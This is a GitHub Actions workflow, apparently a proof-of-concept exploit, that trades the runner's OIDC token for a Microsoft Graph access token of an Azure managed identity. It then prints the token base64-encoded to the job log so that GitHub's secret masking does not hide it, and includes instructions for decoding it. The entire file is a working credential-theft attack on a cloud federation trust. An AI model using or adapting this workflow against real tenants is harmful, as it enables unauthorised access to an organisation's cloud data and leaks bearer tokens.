# .github/workflows/exploit.yml
name: Azure Access
on: workflow_dispatch

permissions:
  id-token: write
  contents: read

env:
  AZURE_TENANT_ID: "67f8647a-6555-4c70-bee4-45625d332c3f"
  UAMI_CLIENT_ID: "3fa85f64-5717-4562-b3fc-2c963f66afa6"

jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Get GitHub OIDC Token
        id: oidc
        run: |
          OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
            -H "Accept: application/json" \
            -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" | jq -r '.value')
          echo "::add-mask::$OIDC_TOKEN"
          echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT
      
      - name: Exchange for UAMI Token (Graph API scope)
        run: |
          GRAPH_TOKEN=$(curl -sX POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "client_id=$UAMI_CLIENT_ID" \
            -d "grant_type=client_credentials" \
            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
            -d "client_assertion=${{ steps.oidc.outputs.oidc_token }}" \
            -d "scope=https://graph.microsoft.com/.default" | jq -r '.access_token')
          
          echo "=============================================="
          echo "=== GRAPH TOKEN (Base64 Encoded) ==="
          echo "=============================================="
          echo "$GRAPH_TOKEN" | base64 -w0
          echo ""
          echo "=============================================="
          echo ""
          echo "Decode with: echo 'BASE64_STRING' | base64 -d"
          echo "Or PowerShell: [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('BASE64_STRING'))"